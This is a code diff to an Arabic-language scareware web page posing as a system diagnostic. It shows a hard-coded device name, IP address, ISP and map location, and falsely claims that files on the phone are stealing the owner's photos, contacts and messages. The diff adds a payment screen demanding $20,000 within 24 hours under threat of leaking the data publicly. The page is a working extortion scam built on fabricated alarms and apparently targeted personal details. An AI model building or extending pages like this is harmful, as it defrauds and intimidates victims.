@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>System Diagnostic - Active</title>
+    <title>System Diagnostic - Final Stage</title>
     <style>
         body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
         canvas { position: fixed; top: 0; left: 0; z-index: -1; }
@@ -19,8 +19,11 @@
         @keyframes blinker { 50% { opacity: 0.3; } }
         
         #final-alert { display: none; background: #000; border: 3px solid #ff0000; color: #ff0000; padding: 20px; margin-top: 20px; border-radius: 10px; text-align: center; box-shadow: 0 0 20px red; }
-        .btn-delete { background: #ff0000; color: #fff; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px; }
-        .btn-delete:hover { background: #b30000; }
+        .btn-delete { background: #ff0000; color: #fff; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px; width: 100%; }
+
+        /* نافذة السعر النهائية */
+        #payment-modal { display: none; background: #1a0000; border: 4px solid #ff0000; color: #fff; padding: 20px; margin-top: 20px; border-radius: 10px; text-align: center; box-shadow: 0 0 50px red; }
+        .price-tag { font-size: 24px; color: #ffff00; font-weight: bold; margin: 15px 0; text-shadow: 2px 2px #000; }
     </style>
 </head>
 <body>
@@ -48,7 +51,16 @@
                 <p>تم العثور على 4 مستندات داخل هاتفك تقوم بإرسال جميع بياناتك وجميع صورك وجميع جهات اتصالك وجميع الرسائل إلى مصدر مجهول.</p>
                 <hr style="border-color: #ff0000;">
                 <p style="color: white;">هل تريد العثور على هذه الملفات وحذفها؟</p>
-                <button class="btn-delete" onclick="alert('خطأ: لا يمكن الحذف، تم تشفير الملفات بواسطة المصدر المجهول!')">نعم، ابدأ الحذف الفوري</button>
+                <button class="btn-delete" id="deleteBtn" onclick="showPayment()">نعم، ابدأ الحذف الفوري</button>
+            </div>
+
+            <div id="payment-modal">
+                <h2 style="color: #ff0000; text-decoration: underline;">كلفة تطهير النظام</h2>
+                <p>سعر حذف الملف الواحد: <span style="color: #00ff00;">5,000$</span></p>
+                <p>عدد الملفات المصابة: <span style="color: #00ff00;">4 ملفات</span></p>
+                <div class="price-tag">المبلغ الإجمالي: 20,000$ (دفترين)</div>
+                <p style="font-size: 12px; color: #aaa;">* يجب دفع المبلغ خلال 24 ساعة لتجنب تسريب البيانات للعلن.</p>
+                <button class="btn-delete" style="background: #222;" onclick="location.reload()">إغلاق النظام</button>
             </div>
         </div>
     </div>
@@ -73,29 +85,32 @@
         }
         setInterval(drawMatrix, 33);
 
-        // Fast Sequence for Testing
         window.onload = function() {
             setTimeout(() => {
                 document.getElementById('device').innerText = "INFINIX (DETECTED)";
                 document.getElementById('ip').innerText = "130.193.246.163";
                 document.getElementById('isp').innerText = "Allay Nawroz Telecom Company/Ltd.";
                 showMap();
-            }, 2000); // يظهر كل شيء بعد ثانيتين فقط للفحص
+            }, 1000); 
         };
 
         function showMap() {
             document.getElementById('map-box').style.display = 'block';
             const lat = 36.1898056; const lon = 44.0156944;
             document.getElementById('googleMap').src = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d${lon}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sar!2siq!4v123456789&layer=s`;
-            
-            setTimeout(() => {
-                document.getElementById('warning-box').style.display = 'block';
-            }, 1500);
+            setTimeout(() => { document.getElementById('warning-box').style.display = 'block'; }, 1000);
         }
 
         function showFinalAlert() {
             document.getElementById('warning-box').style.display = 'none';
             document.getElementById('final-alert').style.display = 'block';
+        }
+
+        // الدالة الجديدة لعرض السعر
+        function showPayment() {
+            document.getElementById('final-alert').style.display = 'none';
+            document.getElementById('map-box').style.display = 'none'; // نخفي الخريطة حتى يركز على السعر
+            document.getElementById('payment-modal').style.display = 'block';
         }
     </script>
 </body>
